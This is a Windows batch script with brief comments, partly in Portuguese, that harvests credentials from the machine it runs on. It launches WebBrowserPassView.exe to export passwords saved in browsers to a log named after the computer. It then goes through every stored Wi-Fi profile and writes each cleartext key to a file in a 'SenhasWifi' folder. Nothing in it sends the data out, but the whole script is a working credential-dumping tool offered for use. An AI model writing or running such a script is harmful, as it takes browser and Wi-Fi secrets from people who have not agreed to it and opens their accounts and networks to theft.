@echo off
:: Echo makes the command prompt window blank. You can try remove this to see what happens.

mkdir log
:: Creates a folder called log only if the folder does not already exist.
start WebBrowserPassView.exe /stext .\log\WebBrowserPassView-%computername%.txt
:: The above runs each application and exports the results as text documents using the naming convention ApplicationName-ComputerName

cd log
mkdir SenhasWifi
cd SenhasWifi

setlocal enabledelayedexpansion
for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do 	(
	set "ssid=%%~a"
	call :getpwd "%%ssid:~1%%"
	netsh wlan show profile name="%ssid:"=%" key^=clear
	
	)

:getpwd
set "ssid=%*"
netsh wlan show profile name^="%ssid:"=%" key^=clear > "%ssid:"=%".txt
cls
